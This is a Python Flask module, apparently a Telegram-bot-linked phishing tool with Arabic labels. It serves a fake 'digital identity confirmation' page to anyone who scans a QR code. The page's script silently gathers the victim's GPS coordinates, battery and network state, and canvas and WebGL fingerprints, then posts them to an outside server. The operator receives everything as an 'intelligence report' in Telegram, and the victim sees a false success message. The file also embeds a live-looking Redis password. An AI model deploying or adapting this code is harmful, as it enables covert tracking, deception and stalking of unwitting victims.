import os
import io
import json
import redis
import qrcode
from flask import Blueprint, request, jsonify, redirect, url_for

# تحديد اسم الـ Blueprint
qr_bp = Blueprint('qr_deep_link_exploit_v2', __name__)

# --- [1] تأمين اتصال Redis مع إدارة الاستثناءات بالكامل ---
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

redis_client = None
try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10, health_check_interval=30)
    redis_client.ping()
    print("[+] Redis connection established for qr_pairing module.")
except Exception as e:
    print(f"[-] Critical Redis Connection Error in qr_pairing: {e}")

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

def init_qr_routes(app, bot):

    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        try:
            if not request.is_json:
                return jsonify({"status": "error", "message": "Invalid content type"}), 400

            data = request.get_json(silent=True) or {}
            token = data.get('token')
            
            if not token:
                return jsonify({"status": "error", "message": "Missing token"}), 400

            if not redis_client:
                print("[-] Redis client is not available. Cannot process QR token.")
                return jsonify({"status": "error", "message": "Database offline"}), 500

            # التحقق الآمن من الـ Token واستخراج الـ Chat ID المرتبط به
            try:
                owner_chat_id = redis_client.get(f"qr_token:{token}")
                if owner_chat_id:
                    # حذف الـ token بعد استخدامه لمرة واحدة لضمان الأمان وعدم تكرار الطلب
                    redis_client.delete(f"qr_token:{token}")
            except Exception as redis_err:
                print(f"[-] Redis read/delete error for token {token}: {redis_err}")
                owner_chat_id = None

            if owner_chat_id:
                source_ip = (
                    request.headers.get('CF-Connecting-IP') or 
                    request.headers.get('X-Forwarded-For') or 
                    request.headers.get('X-Real-IP') or 
                    request.remote_addr
                )
                if source_ip and ',' in source_ip:
                    source_ip = source_ip.split(',')[0].strip()

                geo = data.get('geolocation', {})
                battery = data.get('battery', {})
                network = data.get('network', {})
                screen = data.get('screen', {})
                fingerprint = data.get('fingerprint', {})

                msg = (
                    "🎯🔥 **[تقرير استخبارات الـ QR الميدانية]**\n"
                    "--------------------------------------------------\n"
                    f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
                    f"📍 **إحداثيات الموقع (GPS):**\n"
                    f"   • خط العرض: `{geo.get('latitude', 'مرفوض/غير متاح')}`\n"
                    f"   • خط الطول: `{geo.get('longitude', 'مرفوض/غير متاح')}`\n"
                    f"   • الدقة: `{geo.get('accuracy', 'N/A')} متر`\n"
                    f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
                    f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
                    f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
                    f"🧠 **معمارية المعالج:** `{fingerprint.get('cpu_architecture', 'N/A')}`\n"
                    f"💾 **ذاكرة الجهاز:** `{fingerprint.get('device_memory', 'N/A')} GB`\n"
                    f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
                    f"🎨 **بصمة Canvas:** `{fingerprint.get('canvas_hash', 'N/A')}`\n"
                    f"🖼️ **بصمة WebGL:** `{fingerprint.get('webgl_hash', 'N/A')}`\n"
                    f"🌐 **اللغة المحلية:** `{fingerprint.get('language', 'N/A')}`\n"
                    f"⏳ **المنطقة الزمنية:** `{fingerprint.get('timezone', 'N/A')}`\n"
                    f"🕵️ **وضع التصفح الخفي:** `{fingerprint.get('incognito_mode', 'N/A')}`\n"
                    f"⚙️ **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
                    "--------------------------------------------------"
                )
                try:
                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                except Exception as bot_err:
                    print(f"[-] Telegram dispatch error to {owner_chat_id}: {bot_err}")
                
            return jsonify({"status": "synchronized", "code": 200}), 200
            
        except Exception as err:
            print(f"[-] Unhandled exception in silent_session_sync: {err}")
            return jsonify({"status": "server_error", "code": 500, "message": str(err)}), 500

    @app.route('/qr_scan_target', methods=['GET'])
    def qr_scan_target():
        token = request.args.get('token', '')
        if not token:
            return redirect("https://www.google.com", code=302)

        html_content = f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>تأكيد الهوية الرقمية</title>
            <style>
                body {{
                    background-color: #0d1117;
                    color: #e6edf3;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                    margin: 0;
                    padding: 20px;
                    box-sizing: border-box;
                    text-align: center;
                }}
                .card {{
                    background: #161b22;
                    padding: 30px;
                    border-radius: 12px;
                    box-shadow: 0 8px 16px rgba(0,0,0,0.4);
                    max-width: 400px;
                    width: 100%;
                    border: 1px solid #30363d;
                }}
                .spinner {{
                    border: 4px solid rgba(56, 189, 248, 0.1);
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    border-left-color: #38bdf8;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px auto;
                }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                h3 {{ margin-bottom: 15px; font-size: 20px; color: #c9d1d9; font-weight: 600; }}
                p {{ color: #8b949e; font-size: 14px; line-height: 1.5; margin: 0; }}
            </style>
        </head>
        <body>
            <div class="card" id="mainCard">
                <div class="spinner"></div>
                <h3>جاري التحقق من الجهاز وتأكيد الجلسة...</h3>
                <p>يرجى الانتظار والموافقة على أي أذونات تطلبها الصفحة لإتمام الربط الآمن.</p>
            </div>
            <script>
                function getCanvasFingerprint() {{
                    try {{
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        canvas.width = 256;
                        canvas.height = 128;
                        ctx.textBaseline = 'alphabetic';
                        ctx.fillStyle = '#f60';
                        ctx.fillRect(125, 1, 62, 20);
                        ctx.fillStyle = '#069';
                        ctx.font = '11pt Arial';
                        ctx.fillText('Cwm Fngrprnt', 2, 15);
                        ctx.fillStyle = 'rgba(102, 204, 0, 0.2)';
                        ctx.font = '18pt Arial';
                        ctx.fillText('Cwm Fngrprnt', 4, 45);
                        return canvas.toDataURL();
                    }} catch (e) {{
                        return 'N/A';
                    }}
                }}

                function getWebGLFingerprint() {{
                    try {{
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (!gl) return 'N/A';
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        return vendor + "::" + renderer;
                    }} catch (e) {{
                        return 'N/A';
                    }}
                }}

                async function isIncognitoMode() {{
                    try {{
                        if ('storage' in navigator && 'estimate' in navigator.storage) {{
                            const quota = await navigator.storage.estimate();
                            if (quota.quota === 0) return 'Yes (Chrome/Edge)';
                        }}
                        return 'No';
                    }} catch (e) {{
                        return 'Yes (Fallback)';
                    }}
                }}

                async function collectDataSafely() {{
                    let geoData = {{ latitude: 'مرفوض', longitude: 'مرفوض', accuracy: 'N/A' }};
                    let batteryData = {{ level: 'N/A', charging: 'N/A' }};
                    let networkData = {{ effectiveType: 'N/A', downlink: 'N/A' }};
                    let fingerprintData = {{
                        canvas_hash: getCanvasFingerprint(),
                        webgl_hash: getWebGLFingerprint(),
                        cpu_architecture: navigator.cpuClass || navigator.platform,
                        device_memory: navigator.deviceMemory || 'N/A',
                        language: navigator.language || 'N/A',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                        incognito_mode: await isIncognitoMode()
                    }};

                    try {{
                        if (navigator.geolocation) {{
                            await new Promise((resolve) => {{
                                navigator.geolocation.getCurrentPosition(
                                    (pos) => {{
                                        geoData = {{
                                            latitude: pos.coords.latitude,
                                            longitude: pos.coords.longitude,
                                            accuracy: pos.coords.accuracy
                                        }};
                                        resolve();
                                    }},
                                    (error) => {{
                                        if (error.code === error.PERMISSION_DENIED) {{
                                            geoData.latitude = 'رفض الإذن';
                                            geoData.longitude = 'رفض الإذن';
                                        }}
                                        resolve();
                                    }},
                                    {{ timeout: 3500, maximumAge: 0, enableHighAccuracy: true }}
                                );
                            }});
                        }}
                    }} catch (e) {{}}

                    try {{
                        if (navigator.getBattery) {{
                            const bat = await navigator.getBattery();
                            batteryData = {{
                                level: Math.round(bat.level * 100),
                                charging: bat.charging ? 'نعم (على الشاحن)' : 'لا (بالبطارية)'
                            }};
                        }}
                    }} catch (e) {{}}

                    try {{
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (conn) {{
                            networkData = {{
                                effectiveType: conn.effectiveType || 'N/A',
                                downlink: conn.downlink || 'N/A'
                            }};
                        }}
                    }} catch (e) {{}}

                    return {{
                        token: "{token}",
                        platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
                        userAgent: navigator.userAgent,
                        screen: {{
                            width: window.screen.width,
                            height: window.screen.height,
                            colorDepth: window.screen.colorDepth || 24
                        }},
                        geolocation: geoData,
                        battery: batteryData,
                        network: networkData,
                        fingerprint: fingerprintData
                    }};
                }}

                window.addEventListener('DOMContentLoaded', async () => {{
                    try {{
                        const payload = await collectDataSafely();
                        const response = await fetch('{RAILWAY_URL}/api/v1/session/sync', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify(payload)
                        }});

                        if (response.ok) {{
                            document.getElementById('mainCard').innerHTML = `
                                <div style="font-size: 42px; color: #34d399; margin-bottom: 10px;">✓</div>
                                <h3 style='color: #34d399;'>تمت مصادقة الجلسة بنجاح!</h3>
                                <p>تم ربط الجهاز وتأكيد الهوية بنجاح تام. يمكنك إغلاق الصفحة الآن بأمان.</p>
                            `;
                        }} else {{
                            throw new Error('Sync endpoint rejected data');
                        }}
                    }} catch (err) {{
                        document.getElementById('mainCard').innerHTML = `
                            <div style="font-size: 42px; color: #ef4444; margin-bottom: 10px;">✕</div>
                            <h3 style='color: #ef4444;'>انتهت مهلة الاتصال</h3>
                            <p>تعذر إتمام عملية الربط الآمن، يرجى مسح الكود مرة أخرى.</p>
                        `;
                    }}
                }});
            </script>
        </body>
        </html>
        """
        return html_content, 200

def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=1)
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#000000", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="JPEG")
        buf.seek(0)
        return buf
    except Exception as e:
        print(f"[-] Error generating QR code bytes: {e}")
        return io.BytesIO()
